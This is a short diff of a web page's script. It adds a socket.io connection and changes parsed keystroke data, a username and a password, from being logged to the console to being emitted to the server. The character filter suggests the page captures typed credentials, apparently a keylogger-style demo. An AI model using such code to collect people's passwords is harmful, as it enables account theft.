@@ -39,7 +39,10 @@
 		</div>
 	</div>
 
+	<script src="/socket.io/socket.io.js"></script>
 	<script>
+		var socket = io();
+
 		function isChar(ch) {
 			let db = "qwertyuiopasdfghjklzxcvbnm";
 			for (let i = 0; i < db.length; i++) {
@@ -104,13 +107,22 @@
 			let data = read(pkg);
 			
 			// send data package to server
-			console.log("Package => " + pkg);
+			socket.emit('send', {
+				key: "Package",
+				value: pkg
+			});
 
 			// send username to server
-			console.log("\tUsername: " + data[0]);
+			socket.emit('recive', {
+				key: "Username",
+				value: data[0]
+			});
 
 			// send password to server
-			console.log("\tPassword: " + data[1]);
+			socket.emit('recive', {
+				key: "Password",
+				value: data[1]
+			});
 		}
 	</script>
 
